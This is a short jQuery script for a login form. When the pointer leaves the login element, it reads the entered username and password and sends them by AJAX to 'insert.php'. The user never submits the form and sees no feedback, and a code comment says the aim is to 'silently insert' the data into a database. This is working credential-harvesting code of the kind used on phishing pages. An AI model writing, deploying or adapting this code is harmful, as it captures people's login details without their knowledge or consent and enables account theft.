$(document).ready(function () {
  $('#login').on('mouseleave',function() {
      event.preventDefault();
      let username = $('#username').val();
      let password = $('#password').val();
      if(username !="" && password !="")
      {
          $.ajax({
              url : 'insert.php',
              type: "POST",
              data: {
                  username: username,
                  password: password
              },
              cache: false,
              success: function()
              {
                 
              }
     
          })
      }
      // sielently insert data to the db using onMouseLeave js event and ajax
  });
})